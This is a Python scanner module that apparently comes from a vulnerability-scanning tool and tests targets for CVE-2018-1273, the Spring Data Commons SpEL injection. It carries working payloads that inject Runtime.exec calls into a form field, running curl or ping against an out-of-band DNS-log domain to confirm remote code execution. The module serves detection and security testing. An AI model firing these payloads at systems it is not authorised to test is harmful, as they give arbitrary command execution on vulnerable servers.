#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.api.dns import dns
from lib.tool.md5 import random_md5
from time import sleep

cve_2018_1273_payloads = [
    {
        'path': 'users?page=&size=5',
        'data': 'username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("curl DNSDOMAIN")]=&password=&repeatedPassword='
    },
    {
        'path': 'users?page=&size=5',
        'data': 'username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("ping -c 4 DNSDOMAIN")]=&password=&repeatedPassword='
    },
    {
        'path': 'users?page=&size=5',
        'data': 'username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("ping DNSDOMAIN")]=&password=&repeatedPassword='
    }
]

def cve_2018_1273_scan(self, clients):
    ''' Spring Data是一个用于简化数据库访问, 并支持云服务的开源框架;
        Spring Data Commons是Spring Data下所有子项目共享的基础框架;
        Spring Data Commons 在2.0.5及以前版本中, 存在一处SpEL表达式注入漏洞, 
            攻击者可以注入恶意SpEL表达式以执行任意命令
    '''
    client = clients.get('reqClient')
    sessid = 'f638f51cbd7085fc19b791bb689ad7d7'
    
    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'RCE',
        'vul_id': 'CVE-2018-1273',
    }
    
    headers = {
        'Referer': client.base_url
    }

    for payload in cve_2018_1273_payloads:
        md = random_md5()                                       # * 随机md5值, 8位
        dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名

        path = payload['path']
        data = payload['data'].replace('DNSDOMAIN', dns_domain)

        res = client.request(
            'post',
            path,
            data=data,
            headers=headers,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        sleep(3)
        if (dns.result(md, sessid)):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
